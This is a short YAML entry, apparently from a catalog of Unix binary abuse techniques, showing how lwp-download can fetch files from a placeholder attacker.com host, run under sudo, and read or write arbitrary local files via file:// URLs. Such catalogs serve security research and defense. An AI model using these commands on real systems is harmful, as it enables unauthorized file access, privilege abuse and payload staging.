---
description: Fetch a remote file via HTTP GET request.
functions:
  file-download:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        lwp-download $URL $LFILE
  sudo:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo lwp-download $URL $LFILE
  file-read:
    - description: The file path must be absolute.
      code: |
        LFILE=file_to_read
        TF=$(mktemp)
        lwp-download "file://$LFILE" $TF
        cat $TF
  file-write:
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        lwp-download file://$TF $LFILE
---
